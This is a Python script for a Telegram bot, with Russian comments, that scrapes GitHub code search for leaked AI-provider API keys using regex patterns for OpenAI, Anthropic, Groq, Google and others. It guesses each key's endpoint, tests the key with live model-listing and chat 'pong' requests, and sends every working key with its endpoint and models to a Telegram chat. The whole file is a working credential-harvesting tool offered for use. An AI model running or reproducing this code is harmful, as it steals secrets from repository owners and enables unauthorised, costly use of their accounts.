import os
import re
import sys
import time
import requests
import logging
import asyncio
import random
import sqlite3
from concurrent.futures import ThreadPoolExecutor

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

TOTAL_RUN_TIME = 3600
REPORT_INTERVAL = 900

# ─── ПАТТЕРНЫ КЛЮЧЕЙ ───────────────────────────────────────────────────────
KEY_PATTERNS = [
    {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
    {"provider": "kimi",        "regex": re.compile(r"\bsk-kimi-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "minimax",     "regex": re.compile(r"\bsk-cp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "qwen",        "regex": re.compile(r"\bsk-sp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "openrouter",  "regex": re.compile(r"\bsk-or-v1-[a-f0-9]{64}\b")},
    {"provider": "deepseek",    "regex": re.compile(r"\bsk-[a-f0-9]{32}\b")},
    {"provider": "zhipu",       "regex": re.compile(r"\b[a-f0-9]{32}\.[A-Za-z0-9]{16}\b")},
    {"provider": "huggingface", "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
    {"provider": "groq",        "regex": re.compile(r"\bgsk_[A-Za-z0-9]{52}\b")},
    {"provider": "perplexity",  "regex": re.compile(r"\bpplx-[A-Za-z0-9]{48}\b")},
    {"provider": "google",      "regex": re.compile(r"\bAIzaSy[A-Za-z0-9_-]{33}\b")},
    {"provider": "replicate",   "regex": re.compile(r"\br8_[A-Za-z0-9]{37}\b")},
    {"provider": "generic-sk",  "regex": re.compile(r"\bsk-[A-Za-z0-9_-]{32,}\b")},
]

URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')

# ─── ЭНДПОИНТЫ ─────────────────────────────────────────────────────────────
PROVIDER_ENDPOINTS = {
    "openai": "https://api.openai.com/v1",
    "anthropic": "https://api.anthropic.com/v1",
    "kimi": "https://api.moonshot.cn/v1",
    "minimax": "https://api.minimaxi.com/v1",
    "qwen": "https://dashscope.aliyuncs.com/compatible-mode/v1",
    "deepseek": "https://api.deepseek.com/v1",
    "huggingface": "https://api-inference.huggingface.co",
    "openrouter": "https://openrouter.ai/api/v1",
    "groq": "https://api.groq.com/openai/v1",
    "perplexity": "https://api.perplexity.ai",
    "google": "https://generativelanguage.googleapis.com/v1beta",
    "replicate": "https://api.replicate.com/v1",
    "generic-sk": "https://chat.kxsb.org/api/v1",
    "default": "https://chat.kxsb.org/api/v1"
}

REPO_HINTS = {
    "mistral": "https://api.mistral.ai/v1", "groq": "https://api.groq.com/openai/v1",
    "together": "https://api.together.xyz/v1", "fireworks": "https://api.fireworks.ai/inference/v1",
    "perplexity": "https://api.perplexity.ai", "openrouter": "https://openrouter.ai/api/v1",
    "cerebras": "https://api.cerebras.ai/v1", "deepinfra": "https://api.deepinfra.com/v1/openai",
}

# ─── БАЗА ДАННЫХ (ТЕКСТОВЫЙ ФАЙЛ) ──────────────────────────────────────────
dead_keys_set = set() # Храним ключи в памяти для мгновенной проверки

def init_db():
    global dead_keys_set
    if os.path.exists('dead_keys.txt'):
        with open('dead_keys.txt', 'r', encoding='utf-8') as f:
            dead_keys_set = set(line.strip() for line in f if line.strip())
    logger.info(f"🗄 База данных dead_keys.txt загружена. В памяти уже {len(dead_keys_set)} мертвых ключей.")

def is_dead(key):
    return key in dead_keys_set

def mark_dead(key):
    if key not in dead_keys_set:
        dead_keys_set.add(key)
        with open('dead_keys.txt', 'a', encoding='utf-8') as f:
            f.write(f"{key}\n")

# ─── ПАРСИНГ GITHUB ────────────────────────────────────────────────────────
repo_url_cache = {}

def get_urls_from_repo_configs(repo):
    if repo in repo_url_cache: return repo_url_cache[repo]
    found_urls = []
    try:
        tree_url = f"https://api.github.com/repos/{repo}/git/trees/HEAD?recursive=1"
        resp = requests.get(tree_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}"}, timeout=10)
        if resp.status_code == 200:
            for item in resp.json().get("tree", []):
                if item["type"] == "blob" and any(x in item["path"].lower() for x in ['.env', 'config', 'settings']):
                    file_url = f"https://api.github.com/repos/{repo}/contents/{item['path']}"
                    f_resp = requests.get(file_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
                    if f_resp.status_code == 200:
                        for u in URL_REGEX.findall(f_resp.text):
                            if any(x in u for x in ['github.com', 'telegram', 'w3.org']): continue
                            match = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                            if match: found_urls.append(match.group(1))
    except: pass
    repo_url_cache[repo] = list(set(found_urls))
    return repo_url_cache[repo]

def fetch_github_targets():
    logger.info("🐙 Ищу ключи на GitHub...")
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
    
    queries = [
        "sk-proj- language:Python", "sk-ant-api03- language:Python", 
        "sk-kimi- language:Python", "sk-cp- language:Python",
        "sk-sp- language:Python", "hf_ language:Python",
        "\"gsk_\" language:Python", "\"pplx-\" language:Python", "\"AIzaSy\" language:Python",
        "\"sk-\" language:JSON", "\"sk-\" language:YAML", "\"sk-\" language:JavaScript"
    ]
    query = random.choice(queries)
    page = random.randint(1, 10) 
    
    try:
        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 50, "page": page}, timeout=15)
        if resp.status_code == 403: 
            logger.error("❌ GitHub 403: Лимит поиска или неверный токен.")
            return []
        resp.raise_for_status()
        
        items = resp.json().get("items", [])
        logger.info(f"📄 Найдено файлов на странице {page}: {len(items)}")
        
        targets = []
        for i, item in enumerate(items[:20], 1):
            repo, path = item["repository"]["full_name"], item["path"]
            logger.info(f"   └ [{i}/{min(len(items), 20)}] Скачиваю {repo}...")
            
            try:
                # stream=True позволяет проверить размер до скачивания
                file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5, stream=True)
                if file_resp.status_code != 200:
                    continue
                    
                content_length = file_resp.headers.get('content-length')
                if content_length and int(content_length) > 100_000:
                    logger.info(f"      ⏩ Пропускаю большой файл ({(int(content_length)//1024)} КБ)")
                    continue
                    
                text = file_resp.content.decode('utf-8', errors='ignore')
            except requests.RequestException:
                continue
                
            lines = text.split('\n')
            for line in lines:
                for p in KEY_PATTERNS:
                    for match in p["regex"].finditer(line):
                        token = match.group(0)
                        
                        if p["provider"] == "generic-sk":
                            if any(token.startswith(prefix) for prefix in ["sk-proj-", "sk-ant-", "sk-kimi-", "sk-cp-", "sk-sp-", "sk-or-v1-"]):
                                continue
                                
                        api_urls = []
                        
                        # ПРИОРИТЕТ 1: URL в этой же строке
                        for u in URL_REGEX.findall(line):
                            if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
                            match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                            if match_url: api_urls.append(match_url.group(1))
                        
                        # ПРИОРИТЕТ 2: Префикс ключа
                        if not api_urls and p["provider"] != "generic-sk":
                            api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
                        
                        # ПРИОРИТЕТ 3: Конфиги репо (Trees API)
                        if not api_urls:
                            api_urls.extend(get_urls_from_repo_configs(repo)[:1])
                        
                        # ПРИОРИТЕТ 4: Переменная
                        if not api_urls:
                            var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
                            var_name = var_match.group(1).lower() if var_match else ""
                            for hint, url in REPO_HINTS.items():
                                if hint in var_name: api_urls.append(url); break
                            if not api_urls:
                                if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
                                elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
                        
                        # ПРИОРИТЕТ 5: Имя репо
                        if not api_urls:
                            combined = (repo + " " + path).lower()
                            for hint, url in REPO_HINTS.items():
                                if hint in combined: api_urls.append(url); break
                                
                        # ПРИОРИТЕТ 6: Дефолт
                        if not api_urls:
                            api_urls.append(PROVIDER_ENDPOINTS["default"])
                            
                        for url in list(set(api_urls))[:1]:
                            if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
            time.sleep(0.2) 
            
        unique_targets, seen = [], set()
        for t in targets:
            sig = f"{t['key']}_{t['endpoint']}"
            if sig not in seen: seen.add(sig); unique_targets.append(t)
            
        logger.info(f"✅ Парсинг завершен. Найдено целей: {len(unique_targets)}")
        return unique_targets
    except Exception as e:
        logger.error(f"❌ Ошибка GitHub: {e}")
        return []

# ─── ПРОВЕРКА ──────────────────────────────────────────────────────────────
def check_endpoint(api_key, endpoint):
    try:
        resp = requests.get(f"{endpoint}/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
        if resp.status_code == 200: return {"status": "ok", "models": [m.get("id", "") for m in resp.json().get("data", [])]}
        elif resp.status_code == 429: return {"status": "429", "models": []}
    except: pass
    return {"status": "dead", "models": []}

def probe_single(api_key, endpoint, model):
    payload = {"model": model, "messages": [{"role": "user", "content": "pong"}], "max_tokens": 5}
    start = time.perf_counter()
    try:
        resp = requests.post(f"{endpoint}/chat/completions", headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}, json=payload, timeout=10)
        latency = round(time.perf_counter() - start, 2)
        if resp.status_code == 200: return {"model": model, "ok": True, "latency": latency, "status": 200}
        elif resp.status_code == 429: return {"model": model, "ok": True, "latency": latency, "status": 429}
    except: pass
    return {"model": model, "ok": False, "latency": "?", "status": "ERR"}

def probe_models(api_key, endpoint, models):
    with ThreadPoolExecutor(max_workers=5) as executor:
        return list(executor.map(lambda m: probe_single(api_key, endpoint, m), models[:5]))

def format_report(key, endpoint, models, probes):
    working = [p for p in probes if p["ok"]]
    if not working: return None
    lines = ["🔑 Новый ключ", "", f"🌐 API — {endpoint}", f"🗝 Ключ — {key}", "✅ Работают —"]
    for p in working:
        limit = " (⚠️ Лимит)" if p.get("status") == 429 else ""
        lines.append(f"{p['model']} — {p['latency']}s (pong){limit}")
    lines.append(f"📦 Все модели — " + ", ".join(models[:5]))
    if len(models) > 5: lines.append(f"и ещё {len(models) - 5} за кадром")
    return "\n".join(lines)

# ─── ГЛАВНЫЙ ЦИКЛ ──────────────────────────────────────────────────────────
async def long_scan_loop():
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    start_time = time.time()
    cycle_start_time = time.time()
    total_checked, total_working, cycle_working = 0, 0, 0
    
    logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
    
    while time.time() - start_time < TOTAL_RUN_TIME:
        targets = await asyncio.to_thread(fetch_github_targets)
        total_checked += len(targets)
        
        for t in targets:
            key, endpoint = t["key"], t["endpoint"]
            if is_dead(key): continue
                
            logger.info(f"Проверяю {key[:10]}... на {endpoint}")
            chk = await asyncio.to_thread(check_endpoint, key, endpoint)
            
            if chk["status"] == "dead":
                logger.info("   └ ❌ Мертвый")
                mark_dead(key)
                continue
                
            if chk["status"] == "429":
                logger.info("   └ ⚠️ Rate Limit (ключ живой)")
                report = f"⚠️ Ключ с лимитом\n🌐 {endpoint}\n🗝 {key}"
                if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=report)
                total_working += 1; cycle_working += 1
                continue
                
            logger.info(f"   └ ✅ Доступно моделей: {len(chk['models'])}. Делаю пробы...")
            probes = await asyncio.to_thread(probe_models, key, endpoint, chk["models"])
            report = format_report(key, endpoint, chk["models"], probes)
            
            if report:
                total_working += 1; cycle_working += 1
                if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=report)
                logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
            else:
                logger.info("   └ ❌ Мертвый (все пробы 401/403)")
                mark_dead(key)
        
        if time.time() - cycle_start_time >= REPORT_INTERVAL:
            summary = f"⏳ Отчет\nЗа {REPORT_INTERVAL//60} мин:\nПроверено: {total_checked}\nНовых рабочих: {cycle_working}"
            if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=summary)
            cycle_start_time = time.time()
            cycle_working = 0
            
        await asyncio.sleep(5)

    if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 Час прошел. Всего рабочих: {total_working}")
    logger.info("✅ Сессия завершена.")

if __name__ == "__main__":
    if not BOT_TOKEN or not GITHUB_TOKEN: sys.exit(1)
    asyncio.run(long_scan_loop())
